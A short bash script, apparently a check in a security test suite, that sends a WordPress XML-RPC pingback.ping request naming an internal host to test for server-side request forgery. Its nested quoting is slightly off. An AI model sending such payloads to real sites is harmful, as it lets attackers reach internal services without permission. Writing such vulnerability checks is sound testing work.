#!/usr/bin/env bash
set -euo pipefail
. "$(dirname "$0")/_lib.sh"
body="<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://example.invalid/post</string></value></param><param><value><string>http://internal-sink:8025/</string></value></param></params></methodCall>"
curl -s -X POST "$TARGET/xmlrpc.php" -H "content-type: text/xml" --data "$body" | grep -q "INTERNAL-SINK"
